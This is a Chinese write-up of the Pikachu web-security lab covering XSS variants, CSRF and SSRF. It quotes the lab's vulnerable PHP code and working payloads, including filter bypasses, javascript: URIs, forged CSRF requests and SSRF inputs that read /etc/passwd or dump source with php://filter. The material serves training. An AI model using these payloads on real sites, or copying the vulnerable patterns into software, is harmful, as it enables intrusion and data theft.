class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;</span><br><span class="line">    <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br></pre></td></tr></table></figure><p>获取get传入的text，然后将+替换为’ ‘，然后写入id为dom的div。限定了位置。这里需要注意的是’”+xss+”‘， ‘’会变成””，而且”+xss+”代表的就是输入内容。html仿佛会自动默认一些东西。</p><p>playload1:</p><pre><code>&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/05/1BU5qEobI28dS96.png"></p><h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><p>随便提交下，可以看到回显并没有在html文件中产生，并且是用post方式提交。</p><p>来看源码吧，xss_blind.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$link</span>=connect();</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;content&quot;</span>,<span class="variable">$_POST</span>) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$content</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$name</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$time</span>=<span class="variable">$time</span>=date(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert into xssblind(time,content,name) values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$content</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;谢谢参与，阁下的看法我们已经收到!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;ooo.提交出现异常，请重新提交&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post的数据存到了数据库。</p><p>我们来看后台。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;main-content&quot; xmlns=&quot;http://www.w3.org/1999/html&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;main-content-inner&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;breadcrumbs ace-save-state&quot; id=&quot;breadcrumbs&quot;&gt;</span><br><span class="line">            &lt;ul class=&quot;breadcrumb&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;i class=&quot;ace-icon fa fa-home home-icon&quot;&gt;&lt;/i&gt;</span><br><span class="line">                    &lt;a href=<span class="string">&quot;../xss.php&quot;</span>&gt;xss&lt;/a&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;xss盲打&lt;/li&gt;</span><br><span class="line"></span><br><span class="line">            &lt;/ul&gt;&lt;!-- /.breadcrumb --&gt;</span><br><span class="line">            &lt;a href=<span class="string">&quot;#&quot;</span> style=<span class="string">&quot;float:right&quot;</span> data-container=<span class="string">&quot;body&quot;</span> data-toggle=<span class="string">&quot;popover&quot;</span> data-placement=<span class="string">&quot;bottom&quot;</span> title=<span class="string">&quot;tips(再点一下关闭)&quot;</span></span><br><span class="line">               data-content=<span class="string">&quot;被弹了吗?&quot;</span>&gt;</span><br><span class="line">                点一下提示~</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;page-content&quot;&gt;</span><br><span class="line">            &lt;div id=<span class="string">&quot;list_blid_con&quot;</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$state</span>;<span class="meta">?&gt;</span></span><br><span class="line">                &lt;h2&gt;用户反馈的意见列表：&lt;/h2&gt;</span><br><span class="line">                &lt;table class=&quot;table table-bordered table-striped&quot;&gt;</span><br><span class="line">                    &lt;tr&gt;</span><br><span class="line">                        &lt;td&gt;编号&lt;/td&gt;</span><br><span class="line">                        &lt;td&gt;时间&lt;/td&gt;</span><br><span class="line">                        &lt;td&gt;内容&lt;/td&gt;</span><br><span class="line">                        &lt;td&gt;姓名&lt;/td&gt;</span><br><span class="line">                        &lt;td&gt;操作&lt;/td&gt;</span><br><span class="line">                    &lt;/tr&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="variable">$query</span>=<span class="string">&quot;select * from xssblind&quot;</span>;</span><br><span class="line">                    <span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">                    <span class="keyword">while</span>(<span class="variable">$data</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">                        <span class="variable">$html</span>=&lt;&lt;&lt;A</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&#123;<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>]&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&#123;<span class="variable">$data</span>[<span class="string">&#x27;time&#x27;</span>]&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&#123;<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&#123;<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>]&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;a href=<span class="string">&quot;admin.php?id=<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&quot;</span>&gt;删除&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">A;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">                &lt;/table&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;&lt;!-- /.page-content --&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&lt;!-- /.main-content --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从数据库中提出信息，然后显示在html前端中。</p><p>所以这个盲打就是，我们输入的内容会保存到数据库，管理员登录后，会从数据库中提取消息然后展示到前端，引发xss。</p><p><img src="https://s2.loli.net/2022/03/05/YTIAodpKgwUteZQ.png"></p><h3 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h3><p>get方式传参，会对我们输入进行过滤。</p><p>php代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里会使用正则对&lt;script进行替换为空,也就是过滤掉</span></span><br><span class="line">    <span class="variable">$message</span>=preg_replace(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line"><span class="comment">//    $message=str_ireplace(&#x27;&lt;script&gt;&#x27;,$_GET[&#x27;message&#x27;]);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$message</span> == <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;别说这些&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;的话,不要怕,就是干!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到利用正则表达式进行了过滤。</p><p>大小写绕过。</p><pre><code>&lt;SCRIPT&gt;alert(&quot;The_Itach1&quot;)&lt;/SCRIPT&gt;</code></pre><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;</span></span><br><span class="line"><span class="comment">//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;&#123;$message&#125;&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;</span></span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt;<span class="subst">&#123;$message&#125;</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用htmlspecialchars函数对特定字符进行了转义。<br><img src="https://s2.loli.net/2022/03/06/aeypKb184IDOMYd.png"><br>但是未对’进行转义。所以可以使用</p><pre><code>#&#39; onclick=&#39;alert(/xss/)</code></pre><p><img src="https://s2.loli.net/2022/03/06/hTBIUtF75cXMmQz.png"></p><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>和上面一样是href，但是多加了点东西。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>htmlspecialchars函数多加了个参数，ENT_QUOTES</p><pre><code>ENT_QUOTES - 编码双引号和单引号。</code></pre><p>所以上面的方法没法用了。</p><p>但是在a标签的href属性里面,可以使用javascript协议来执行js，可以尝试使用伪协议绕过。</p><pre><code>javascript:alert(/xss/)</code></pre><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>先随便输人看看。<br><img src="https://s2.loli.net/2022/03/06/xnBwa9R6OjUktid.png"></p><p>看看源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$jsvar</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line"><span class="comment">//    $jsvar=htmlspecialchars($_GET[&#x27;message&#x27;],ENT_QUOTES);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$jsvar</span> == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;img src=&#x27;<span class="subst">&#123;$PIKA_ROOT_DIR&#125;</span>assets/images/nbaplayer/tmac.jpeg&#x27; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable">$ms</span>=<span class="string">&#x27;&lt;?php echo $jsvar;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ms</span>.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ms</span> == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>未对特殊字符进行转义。</p><p>闭合下</p><pre><code>&lt;/script&gt;&lt;script&gt;alert(&quot;The_Itach1&quot;)&lt;/script&gt;</code></pre><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF(跨站请求伪造)概述</p><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p><p>这里列举一个场景解释一下，希望能够帮助你理解。</p><p>场景需求：</p><pre><code>小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录---修改会员信息，提交请求---修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。 因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：--对敏感信息的操作增加安全的token；--对敏感信息的操作增加安全的验证码；--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</code></pre><p>个人看完后，感觉条件比较苛刻，并且需要知道传参变量的含义。</p><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>题目给了很多账号，我们先随便登录一个然后抓个包。<br><img src="https://s2.loli.net/2022/03/06/TibwvN2AdVYufZs.png"></p><p>这时候就可以登录另一个号，然后打开下面的链接，就可以在另一个号实现修改信息的效果。</p><p>先登录grady的号，信息如下。</p><pre><code>姓名:grady性别:boy手机:13676765545住址:nba hs</code></pre><p>另外打开url后<br>    邮箱:<a href="mailto:&#x67;&#114;&#97;&#x64;&#121;&#64;&#112;&#105;&#107;&#x61;&#x63;&#x68;&#117;&#x2e;&#99;&#x6f;&#x6d;">&#x67;&#114;&#97;&#x64;&#121;&#64;&#112;&#105;&#107;&#x61;&#x63;&#x68;&#117;&#x2e;&#99;&#x6f;&#x6d;</a><br>    /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit<br>信息被修改。</p><pre><code>姓名:grady性别:boy手机:18626545453住址:chain邮箱:vince@pikachu.com</code></pre><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>传参方式变了，bp先抓个包。<br><img src="https://s2.loli.net/2022/03/06/ymKMksxXlUOZDcd.png"><br>然后就是生成攻击方式的问题了，由于不是get传参，是post传参，没法直接用url，需要写一个html文件bp的</p><p>这时候我们可以利用Generate CSRF PoC功能生成一个html文件，然后将其挂在攻击机开的http服务中。然后让目标去访问这个html文件。</p><p><img src="https://s2.loli.net/2022/03/07/pm2nYzwbCSve3Vo.png"><br>然后在攻击机上起服务，我这里是直接在本地弄了个post.html</p><p>先登录一个号。然后访问<a href="http://127.0.0.1/post.html%E3%80%82">http://127.0.0.1/post.html。</a><br><img src="https://s2.loli.net/2022/03/07/FbGakgxMlSDKJ8V.png"><br>信息被修改。<br><img src="https://s2.loli.net/2022/03/07/IdNEP2wmCLaAzTY.png"></p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>还是先抓个包看看。<br><img src="https://s2.loli.net/2022/03/07/RODgse5pJlSrwLy.png"><br>在请求中添加了Token。</p><p>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p>每次抓包都会发现Token变了。说明Token的生成是随机的，无法构造url，所以这个题应该主要是在讲如何防止CSRF。</p><p>但是后面发现这些提交都存在储存型xss漏洞，所以完全可以自己获得cookie，然后进行修改。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p><p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>产生漏洞的函数。</p><pre><code>file_get_contents()fsockopen()curl_exec()</code></pre><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//payload:</span></span><br><span class="line"><span class="comment">//file:///etc/passwd  读取文件</span></span><br><span class="line"><span class="comment">//http://192.168.1.15:22 根据banner返回,错误提示,时间延迟扫描端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用了curl_exec，并且没将CURLOPT_RETURNTRANSFER 设置成 1，能将内容输出到网页，造成SSRF。</p><p>利用方式</p><pre><code>http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:80</code></pre><p>可以用来泄露一些服务器的端口的信息。</p><h3 id="SSRF-file-get-contents"><a href="#SSRF-file-get-contents" class="headerlink" title="SSRF(file_get_contents)"></a>SSRF(file_get_contents)</h3><p>file_get_contents() 函数把整个文件读入一个字符串中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span></span><br><span class="line"><span class="comment">//内网请求:http://x.x.x.x/xx.index</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span 